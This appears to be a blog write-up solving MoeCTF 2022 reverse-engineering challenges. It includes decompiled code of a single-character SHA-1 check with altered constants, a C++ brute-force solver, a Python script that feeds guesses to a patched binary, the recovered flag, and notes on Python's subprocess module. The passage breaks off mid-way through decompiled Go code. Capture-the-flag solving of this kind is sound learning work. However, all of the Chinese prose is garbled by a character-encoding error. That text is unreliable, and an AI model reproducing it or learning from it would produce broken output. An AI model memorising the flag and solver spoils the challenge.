<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sha1</span><span class="params">(__int64 text)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-B8h]</span></span><br><span class="line">  <span class="type">char</span> single[<span class="number">12</span>]; <span class="comment">// [rsp+24h] [rbp-B4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> ctx[<span class="number">128</span>]; <span class="comment">// [rsp+30h] [rbp-A8h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 hash[<span class="number">24</span>]; <span class="comment">// [rsp+B0h] [rbp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">88</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    single[<span class="number">0</span>] = *(_BYTE *)(text + i);           <span class="comment">// single=text[i]</span></span><br><span class="line">    sha1_init((__int64)ctx);</span><br><span class="line">    sha1_update((__int64)ctx, (__int64)single, <span class="number">1u</span>i64);</span><br><span class="line">    sha1_final((__int64)ctx, (__int64)hash);</span><br><span class="line">    encrypted[i] = hash[<span class="number">0</span>] | (hash[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | (hash[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (hash[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)check;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç¬‘æ­»,sha1åŠ å¯†æ¯æ¬¡åªå¯¹ä¸€ä¸ªå­—ç¬¦è¿›è¡Œ,ä»–å°†è¾“å…¥çš„88ä¸ªå­—ç¬¦åˆ†åˆ«è¿›è¡Œsha1åŠ å¯†,ç„¶åå°†hashå€¼ä¸€é€šæŒ‰ä½æˆ–æ”¾åˆ°encrypted[1]ä¸Š</p>
<p>å¯¹å•ä¸ªå­—ç¬¦çš„åŠ å¯†å°±å¤±å»äº†sha1åŠ å¯†çš„æ„ä¹‰äº†,å¯ä»¥æš´åŠ›æšä¸¾å•ä¸ªå­—ç¬¦çš„asciiå€¼ç„¶ååŠ å¯†ä¹‹åencrypted[i]å’Œtarget[i]ç›´æ¥è¿›è¡Œæ¯”è¾ƒ,è¿™å°±è§£å‡ºäº†input[i]</p>
<p>äº‘ä¹‹å›å¯¹sha1åŠ å¯†ä¸­çš„ä¸€äº›å‚æ•°è¿›è¡Œäº†é­”æ”¹</p>
<p>é¦–å…ˆæ˜¯sha1_initåˆå§‹åŒ–ä¸­çš„å‚æ•°</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/init.png"
alt="å·¦åŸå§‹,å³é­”æ”¹" />
<figcaption aria-hidden="true">å·¦åŸå§‹,å³é­”æ”¹</figcaption>
</figure>
<p>ç„¶åsha1_transformå‡½æ•°ä¸­ä¹Ÿæœ‰é­”æ”¹</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/sha1_transform_2.png"
alt="sha1_transform_2" />
<figcaption aria-hidden="true">sha1_transform_2</figcaption>
</figure>
<p>åŸæ¥æ˜¯<code>m[i] = (m[i] &lt;&lt; 1) | (m[i] &gt;&gt; 31);</code>é­”æ”¹ä¸º<code>m[i] = (m[i] &lt;&lt; 2) | (m[i] &gt;&gt; 30);</code></p>
<p>å°±è¿™ä¸¤ä¸ªæ”¹åŠ¨</p>
<p>ä¸‹é¢å°±å¯ä»¥æš´åŠ›ç ´è§£äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sha1.h&quot;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> target[<span class="number">88</span>] = &#123;</span><br><span class="line">    <span class="number">0x64744C9A</span>, <span class="number">0x047C2FF1</span>, <span class="number">0xA2D74292</span>, <span class="number">0x85BEF77E</span>, <span class="number">0x711FCBF7</span>, <span class="number">0x669E1609</span>, <span class="number">0x6BBD9DB6</span>, <span class="number">0x6941C8A4</span>,</span><br><span class="line">    <span class="number">0xB16E48B3</span>, <span class="number">0xDE321186</span>, <span class="number">0x5251E8C2</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x711FCBF7</span>, <span class="number">0xCB5C3FAD</span>, <span class="number">0x36568AF5</span>, <span class="number">0xFB8F95A7</span>,</span><br><span class="line">    <span class="number">0x82ACF96A</span>, <span class="number">0x75DCD570</span>, <span class="number">0x7EF00E40</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x4BE9314A</span>, <span class="number">0xCB5C3FAD</span>, <span class="number">0xA2D74292</span>, <span class="number">0xDE321186</span>,</span><br><span class="line">    <span class="number">0xFB8F95A7</span>, <span class="number">0x46927FA8</span>, <span class="number">0xB16E48B3</span>, <span class="number">0xD7C1A410</span>, <span class="number">0x567375C3</span>, <span class="number">0x711FCBF7</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x9C19F0F3</span>,</span><br><span class="line">    <span class="number">0xD035E914</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x6941C8A4</span>, <span class="number">0x0B7D1395</span>, <span class="number">0xD7C1A410</span>, <span class="number">0xC87A7C7E</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0xD7C1A410</span>,</span><br><span class="line">    <span class="number">0xDE321186</span>, <span class="number">0x5251E8C2</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0xD5380C52</span>, <span class="number">0xBEA99D3B</span>, <span class="number">0xCEDB7952</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x73456320</span>,</span><br><span class="line">    <span class="number">0xD7C1A410</span>, <span class="number">0xDE321186</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x581D99E5</span>, <span class="number">0xA2D74292</span>, <span class="number">0x711FCBF7</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x06372812</span>,</span><br><span class="line">    <span class="number">0xFB8F95A7</span>, <span class="number">0x73456320</span>, <span class="number">0xCEDB7952</span>, <span class="number">0xEF53E254</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x9F12424D</span>, <span class="number">0x669E1609</span>, <span class="number">0xFB8F95A7</span>,</span><br><span class="line">    <span class="number">0x9C19F0F3</span>, <span class="number">0xFECF7685</span>, <span class="number">0x0B7D1395</span>, <span class="number">0x1833E8B1</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x9F66DD04</span>, <span class="number">0xA2D74292</span>, <span class="number">0xD7C1A410</span>,</span><br><span class="line">    <span class="number">0xFB8F95A7</span>, <span class="number">0x6941C8A4</span>, <span class="number">0x866CAF4F</span>, <span class="number">0x047C2FF1</span>, <span class="number">0x64744C9A</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0xD5380C52</span>, <span class="number">0xCEDB7952</span>,</span><br><span class="line">    <span class="number">0xDE321186</span>, <span class="number">0x81453D43</span>, <span class="number">0xCB5C3FAD</span>, <span class="number">0xB16E48B3</span>, <span class="number">0xC578F843</span>, <span class="number">0xCEDB7952</span>, <span class="number">0xDE321186</span>, <span class="number">0xE38C6F07</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sha1</span><span class="params">(BYTE c)</span><span class="comment">//æ¥æ”¶ä¸€ä¸ªcharä½œä¸ºè¾“å…¥,è¾“å‡ºåŠ å¯†ä¹‹åçš„å€¼</span></span><br><span class="line">&#123;</span><br><span class="line">    SHA1_CTX ctx;</span><br><span class="line">    BYTE single[<span class="number">12</span>];</span><br><span class="line">    BYTE hash[<span class="number">24</span>];</span><br><span class="line"></span><br><span class="line">    single[<span class="number">0</span>] = c;</span><br><span class="line">    sha1_init(&amp;ctx);</span><br><span class="line">    sha1_update(&amp;ctx, single, <span class="number">1</span>);</span><br><span class="line">    sha1_final(&amp;ctx, hash);</span><br><span class="line">    <span class="keyword">return</span> hash[<span class="number">0</span>] | (hash[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | (hash[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (hash[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> t = <span class="number">0</span>; t &lt; <span class="number">88</span>; ++t)<span class="comment">//éå†88æ¬¡</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> i = <span class="number">20</span>; i &lt; <span class="number">127</span>; ++i)<span class="comment">//æ¯æ¬¡å°è¯•ä»20åˆ°127çš„æ¯ä¸ªasciiå€¼</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (sha1(i) == target[t])<span class="comment">//å¦‚æœå¯¹ä¸Šäº†åˆ™æ‰“å°char(i)</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\moectfwp\MoeCTF_2022-main\Challenges\Reverse\Broken_hash&gt; g++ main.cpp sha1.c -o main</span><br><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\moectfwp\MoeCTF_2022-main\Challenges\Reverse\Broken_hash&gt; ./main</span><br><span class="line">moectf&#123;F1nd_th3_SEH_7hen_B1a5t_My_Fla9_and_Y0u_Can_Get_A_Cup_Of_Milk_Tea_From_YunZh1Jun&#125;</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯çœ‹äº†flagå°±çŸ¥é“è¿™ä¸æ˜¯é¢„æœŸè§£,flagä¸­æåˆ°äº†SEH,ä½†æ˜¯æˆ‘æ²¡æœ‰çœ‹åˆ°?</p>
<h4 id="é¢„æœŸè§£">é¢„æœŸè§£</h4>
<p>äº‘ä¹‹å›ä¸€ç›´è¯´,patchç¨‹åºç„¶åå†™äº¤äº’è„šæœ¬,ä½†æ˜¯æˆ‘å¬ä¸æ‡‚å¥¹åœ¨è¯´å•¥.çœ‹äº†é¢˜è§£æ‰æƒ³æ˜ç™½ä¸ºå•¥è¦è¿™æ ·patchç¨‹åº</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/loc_140001DEF.png"
alt="loc_140001DEF" />
<figcaption aria-hidden="true">loc_140001DEF</figcaption>
</figure>
<p>æŠŠå·¦è¾¹ç¬¬7è¡Œçš„<code>lea rax,dword_140005000</code>æ”¹æˆ<code>lea rax,[rsp+E8h+var_C8]</code>,ä¹Ÿå°±æ˜¯<code>lea rax,[rsp+20h]</code></p>
<p>ç„¶åç¬¬8è¡Œçš„<code>add rax,160h</code>æ”¹æˆ<code>nop</code></p>
<p>è¿™æ ·ç¬¬9è¡Œå°†raxäº¤ç»™rdxä½œä¸ºå‚æ•°,å®é™…ä¸Šå°±æ˜¯å°†var_C8çš„åœ°å€æ”¾åˆ°äº†rdxä¸Š,ç„¶åå°±è¦è°ƒç”¨printfå‡½æ•°äº†.var_C8æ˜¯è‡ªå˜é‡içš„å€¼</p>
<p>è¿™é‡Œè°ƒç”¨printfæ‰“å°iå€¼,å…¶ç›®çš„æ˜¯å•¥å‘¢?</p>
<p>è“è‰²æ¡†æ¡†é‡Œæ˜¯åˆ¤æ–­è¾“å…¥çš„åŠ å¯†æ˜¯å¦å’Œå·²ç»å­˜å‚¨çš„å¯†æ–‡ä¸€è‡´,ä¸ä¸€è‡´åˆ™ä¼šè·³è½¬é»„è‰²æ¡†æ¡†ä¹Ÿå°±æ˜¯loc_140001DEF,ä¸€è‡´åˆ™è·³è½¬çº¢è‰²æ¡†æ¡†æŠ¥å‘Šæ­£ç¡®</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221111001926390.png"
alt="image-20221111001926390" />
<figcaption aria-hidden="true">image-20221111001926390</figcaption>
</figure>
<p>å¦‚æœè¿›å…¥äº†é»„è‰²æ¡†æ¡†,var_8Cä¹Ÿå°±æ˜¯å¾ªç¯å˜é‡æ˜¯æ²¡æœ‰æ¸…é›¶çš„,åœ¨é»„è‰²æ¡†æ¡†ä¸­è°ƒç”¨printfå‡½æ•°æ‰“å°å‡ºvar_8Cçš„å€¼,å¦‚æœvar_8C=1å°±è¯´æ˜ç¬¬ä¸€ä¸ªè¾“å…¥å­—ç¬¦å¯¹ä¸Šå·äº†,æ­¤æ—¶flagå°±å¯ä»¥ç¡®å®šç¬¬ä¸€ä¸ªå­—ç¬¦,ç„¶åæšä¸¾ç¬¬äºŒä¸ªå­—ç¬¦,å½“var_8Cæ‰“å°å‡º2çš„æ—¶å€™,flagå°±ç¡®å®šäº†ç¬¬äºŒä¸ªå­—ç¬¦,ä»¥æ­¤ç±»æ¨</p>
<p>ç„¶è€Œè¿™é‡Œèƒ½å¤Ÿä¸€ä¸ªä¸€ä¸ªå­—ç¬¦çš„ç¡®è®¤å°±æ˜¯å› ä¸ºsha1æ¯æ¬¡åªå¯¹ä¸€ä¸ªå­—ç¬¦åŠ å¯†.å¦‚æœsha1å¯¹æ•´ä¸ªè¾“å…¥åŒæ—¶åŠ å¯†,åˆ™è¿™ç§æ–¹æ³•ä¹Ÿä¸èƒ½ç”¨.</p>
<p>ä¹Ÿå°±æ˜¯è¯´,åªè¦æ˜¯"é¢„æœŸè§£"èƒ½ç”¨,"éé¢„æœŸè§£"ä¹Ÿèƒ½ç”¨,ä¸¤ç§è§£æ³•å®é™…ä¸Šæ˜¯ä¸€ä¸ªé“ç†</p>
<p>ä¸‹é¢ç ”ç©¶ä¸€ä¸‹é¢„æœŸè§£çš„è§£å¯†è„šæœ¬</p>
<h4 id="è§£å¯†è„šæœ¬">è§£å¯†è„šæœ¬</h4>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;moectf&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, <span class="number">88</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x21</span>,<span class="number">0x7f</span>):</span><br><span class="line">        tmp = flag + <span class="built_in">chr</span>(j) * (<span class="number">88</span> - i)<span class="comment">#å¼€å¤´æ˜¯å·²ç»ç¡®å®šçš„flag,åé¢å‰©ä½™çš„å­—ç¬¦å…¨éƒ½ä½¿ç”¨chr(j)å¡«å……,å¡«æ»¡88ä¸ªå­—ç¬¦</span></span><br><span class="line"></span><br><span class="line">        p = subprocess.Popen([<span class="string">&quot;Broken_hash.exe&quot;</span>], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)<span class="comment">#å»ºç«‹å­è¿›ç¨‹,å°†å…¶ä¸‰æ ‡é‡å®šå‘åˆ°ç®¡é“</span></span><br><span class="line">        p.stdin.write(tmp.encode())<span class="comment">#å°†tmpè¾“å…¥åˆ°å­è¿›ç¨‹ çš„æ ‡å‡†è¾“å…¥</span></span><br><span class="line">        p.stdin.close()<span class="comment">#å…³é—­å­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥</span></span><br><span class="line">        out = p.stdout.read()<span class="comment">#ä»å­è¿›ç¨‹æ ‡å‡†è¾“å‡ºè·å–è¾“å‡º</span></span><br><span class="line">        p.stdout.close()<span class="comment">#å…³é—­æ ‡å‡†è¾“å‡º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> out[-<span class="number">1</span>] &gt; i:<span class="comment">#out[-1]æ˜¯outä¸²çš„æœ€åä¸€ä¸ªå­—ç¬¦,ä¹Ÿå°±æ˜¯patchç¨‹åºä¹‹å,è¾“å‡ºçš„åŒ¹é…ä¸Šçš„ä¸‹æ ‡i,ä¹Ÿå°±æ˜¯var_C8,å¦‚æœåŒ¹é…æˆåŠŸ,åˆ™var_C8ä¼šæ¯”iå¤šä¸€ä¸ª,å¦åˆ™ç›¸ç­‰</span></span><br><span class="line">            flag += <span class="built_in">chr</span>(j)<span class="comment">#å¦‚æœvar_C*&gt;iåˆ™jæ·»åŠ åˆ°flagæœ€å</span></span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">flag += <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œä¹‹å</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\moectfwp\MoeCTF_2022-main\Challenges\Reverse\Broken_hash&gt; python ./solve.py</span><br><span class="line">moectf&#123;F</span><br><span class="line">moectf&#123;F1</span><br><span class="line">moectf&#123;F1n</span><br><span class="line">moectf&#123;F1nd</span><br><span class="line">moectf&#123;F1nd_</span><br><span class="line">moectf&#123;F1nd_t</span><br><span class="line">...</span><br><span class="line">moectf&#123;F1nd_th3_SEH_7hen_B1a5t_My_Fla9_and_Y0u_Can_Get_A_Cup_Of_Milk_Tea_From_YunZh1Ju</span><br><span class="line">moectf&#123;F1nd_th3_SEH_7hen_B1a5t_My_Fla9_and_Y0u_Can_Get_A_Cup_Of_Milk_Tea_From_YunZh1Jun</span><br><span class="line">moectf&#123;F1nd_th3_SEH_7hen_B1a5t_My_Fla9_and_Y0u_Can_Get_A_Cup_Of_Milk_Tea_From_YunZh1Jun&#125;</span><br></pre></td></tr></table></figure>
<h4 id="subprocessæ¨¡å—">subprocessæ¨¡å—</h4>
<p>subprocessæ¨¡å—å…è®¸æˆ‘ä»¬å¯åŠ¨ä¸€ä¸ªå­è¿›ç¨‹,å¹¶ä¸”æ§åˆ¶å…¶è¾“å…¥è¾“å…¥è¾“å‡º</p>
<blockquote>
<p><strong>Popen() æ–¹æ³•</strong></p>
<p>Popen æ˜¯ subprocessçš„æ ¸å¿ƒï¼Œå­è¿›ç¨‹çš„åˆ›å»ºå’Œç®¡ç†éƒ½é å®ƒå¤„ç†ã€‚</p>
<p>æ„é€ å‡½æ•°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class subprocess.Popen(args, bufsize=-1, executable=None, stdin=None, stdout=None, stderr=None, </span><br><span class="line">preexec_fn=None, close_fds=True, shell=False, cwd=None, env=None, universal_newlines=False, </span><br><span class="line">startupinfo=None, creationflags=0,restore_signals=True, start_new_session=False, pass_fds=(),</span><br><span class="line">*, encoding=None, errors=None)</span><br></pre></td></tr></table></figure>
<p><strong>å¸¸ç”¨å‚æ•°ï¼š</strong></p>
<ul>
<li>argsï¼šshellå‘½ä»¤ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–è€…åºåˆ—ç±»å‹ï¼ˆå¦‚ï¼šlistï¼Œå…ƒç»„ï¼‰</li>
<li>bufsizeï¼šç¼“å†²åŒºå¤§å°ã€‚å½“åˆ›å»ºæ ‡å‡†æµçš„ç®¡é“å¯¹è±¡æ—¶ä½¿ç”¨ï¼Œé»˜è®¤-1ã€‚
0ï¼šä¸ä½¿ç”¨ç¼“å†²åŒº
1ï¼šè¡¨ç¤ºè¡Œç¼“å†²ï¼Œä»…å½“universal_newlines=Trueæ—¶å¯ç”¨ï¼Œä¹Ÿå°±æ˜¯æ–‡æœ¬æ¨¡å¼
æ­£æ•°ï¼šè¡¨ç¤ºç¼“å†²åŒºå¤§å° è´Ÿæ•°ï¼šè¡¨ç¤ºä½¿ç”¨ç³»ç»Ÿé»˜è®¤çš„ç¼“å†²åŒºå¤§å°ã€‚</li>
<li>stdin, stdout, stderrï¼šåˆ†åˆ«è¡¨ç¤ºç¨‹åºçš„æ ‡å‡†è¾“å…¥ã€è¾“å‡ºã€é”™è¯¯å¥æŸ„</li>
<li>preexec_fnï¼šåªåœ¨ Unix å¹³å°ä¸‹æœ‰æ•ˆï¼Œç”¨äºæŒ‡å®šä¸€ä¸ªå¯æ‰§è¡Œå¯¹è±¡ï¼ˆcallable
objectï¼‰ï¼Œå®ƒå°†åœ¨å­è¿›ç¨‹è¿è¡Œä¹‹å‰è¢«è°ƒç”¨</li>
<li>shellï¼šå¦‚æœè¯¥å‚æ•°ä¸º Trueï¼Œå°†é€šè¿‡æ“ä½œç³»ç»Ÿçš„ shell
æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚</li>
<li>cwdï¼šç”¨äºè®¾ç½®å­è¿›ç¨‹çš„å½“å‰ç›®å½•ã€‚</li>
<li>envï¼šç”¨äºæŒ‡å®šå­è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ã€‚å¦‚æœ env =
Noneï¼Œå­è¿›ç¨‹çš„ç¯å¢ƒå˜é‡å°†ä»çˆ¶è¿›ç¨‹ä¸­ç»§æ‰¿ã€‚</li>
</ul>
</blockquote>
<p>wpä¸­stdin,stderr,stdoutéƒ½è®¾ç½®ä¸ºsubprocess.PIPE,è¿™ä¸ªå€¼ç­‰äº-1</p>
<p>æ„æ€æ˜¯å°†æ ‡å‡†è¾“å…¥è¾“å‡ºé”™è¯¯éƒ½é‡å®šå‘åˆ°ç®¡é“,ç„¶åæ‰å¯ä»¥è°ƒç”¨<code>p.stdin.write()</code>,è¿˜æœ‰<code>p.stdout.read()</code>ä¸¤ä¸ªå‡½æ•°</p>
<p>å¦åˆ™å­è¿›ç¨‹çš„ä¸‰æ ‡è¿˜æ˜¯æŒ‡å‘é”®ç›˜å’Œå±å¹•çš„,æ­¤æ—¶è°ƒç”¨<code>p.stdin.write()</code>å‡½æ•°ä¼šæŠ¥é”™</p>
<h3 id="gogogo">gogogo</h3>
<p>goè¯­è¨€é€†å‘é¢˜,æ²¡æœ‰æ‰£ç¬¦å·è¡¨</p>
<p>å¾ˆå®¹æ˜“å°±èƒ½æ‰¾åˆ°è¿™ä¹ˆä¸€ä¸ªå‡½æ•°<code>main_flagHandler</code></p>
<p>æ¨æµ‹å’Œflagæœ‰å…³ç³»,ç„¶è€Œè¿™ä¸ªå‡½æ•°çš„åæ±‡ç¼–å¾ˆæŠ½è±¡,æ¨æµ‹æ˜¯åˆå§‹åŒ–çš„goè¯­è¨€çš„ç¯å¢ƒ.</p>
<p>çœ‹äº†å®˜æ–¹wpè¯´å…³é”®å‡½æ•°æ˜¯main_check</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">main_check</span><span class="params">(<span class="built_in">string</span> flag, <span class="type">bool</span> _r0)</span></span><br><span class="line">&#123;</span><br><span class="line">....</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v24 &lt;= *(_QWORD *)(v3 + <span class="number">16LL</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  v27 = v2;</span><br><span class="line">  qmemcpy(&amp;v23.cap, <span class="string">&quot;---moeCTF2022---&quot;</span>, <span class="number">16LL</span>);</span><br><span class="line">  runtime_newobject((runtime__type_0 *)flag.str, (<span class="type">void</span> *)flag.len);</span><br><span class="line">  v26 = v4;</span><br><span class="line">  qmemcpy(v4, <span class="string">&quot;---moeCTF2022---&quot;</span>, <span class="number">16LL</span>);</span><br><span class="line">  runtime_stringtoslicebyte((runtime_tmpBuf *)flag.str, (<span class="built_in">string</span>)__PAIR128__(v5, flag.len), v19);</span><br><span class="line">  v6.tab = (runtime_itab_0 *)&amp;v23.cap;</span><br><span class="line">  v6.data = (<span class="type">void</span> *)<span class="number">16LL</span>;</span><br><span class="line">  main_AesEncrypt(v20, v21, v22, v23, v6);</span><br><span class="line">  <span class="keyword">if</span> ( &amp;v23 == (__uint8 *)<span class="number">-16LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v23.<span class="built_in">array</span> = v27;</span><br><span class="line">    ptr = v7;</span><br><span class="line">    v23.len = <span class="number">2LL</span> * (_QWORD)v27;</span><br><span class="line">    runtime_makeslice(<span class="number">0LL</span>, <span class="number">16LL</span>, v8, (<span class="type">void</span> *)(<span class="number">2LL</span> * (_QWORD)v27));</span><br><span class="line">    v11 = v23.<span class="built_in">array</span>;</span><br><span class="line">    v12 = v23.len;</span><br><span class="line">    v13 = ptr;</span><br><span class="line">    v14 = <span class="number">0LL</span>;</span><br><span class="line">    v15 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">while</span> ( (<span class="type">int</span>)v11 &gt; v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = v13[v14];</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v15 &gt;= v12 )</span><br><span class="line">        runtime_panicIndex();</span><br><span class="line">      (*v15)[v9] = byte_7F65E7[v16 &gt;&gt; <span class="number">4LL</span>];</span><br><span class="line">      v10 = &amp;(*v15)[<span class="number">1LL</span>];</span><br><span class="line">      v17 = byte_7F65E7[v16 &amp; <span class="number">0xF</span>LL];</span><br><span class="line">      <span class="keyword">if</span> ( v12 &lt;= (<span class="type">unsigned</span> <span class="type">int</span>)&amp;(*v15)[<span class="number">1LL</span>] )</span><br><span class="line">        runtime_panicIndex();</span><br><span class="line">      (*v15)[v9 + <span class="number">1LL</span>] = v17;</span><br><span class="line">      ++v14;</span><br><span class="line">      v15 = (runtime_tmpBuf *)((<span class="type">char</span> *)v15 + <span class="number">2LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v18 = v9;</span><br><span class="line">    